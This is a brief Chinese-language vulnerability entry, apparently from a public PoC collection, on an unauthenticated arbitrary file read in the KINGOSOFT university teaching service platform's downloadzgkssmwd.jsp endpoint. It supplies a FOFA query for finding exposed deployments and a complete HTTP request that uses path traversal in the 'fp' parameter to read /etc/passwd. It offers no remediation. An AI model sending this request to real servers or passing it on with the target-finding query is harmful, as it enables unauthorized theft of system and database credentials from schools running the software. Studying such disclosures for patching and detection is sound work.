## KINGOSOFT downloadzgkssmwd.jsp 任意文件读取漏洞

## 漏洞描述
KINGOSOFT 高校智慧校园教学综合服务平台 `downloadzgkssmwd.jsp` 接口可直接读取任意文件，未授权攻击者可获取数据库配置等敏感信息，进一步入侵系统。

## 网络空间测绘
```
fofa: app="KINGOSOFT高校智慧校园教学综合服务平台"
```

## POC
```
GET /zgks/downloadzgkssmwd.jsp?fp=../../../../../../etc/passwd HTTP/1.1
Host: [请补充实际域名]
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Connection: keep-alive
```

## 参考
- 社区情报

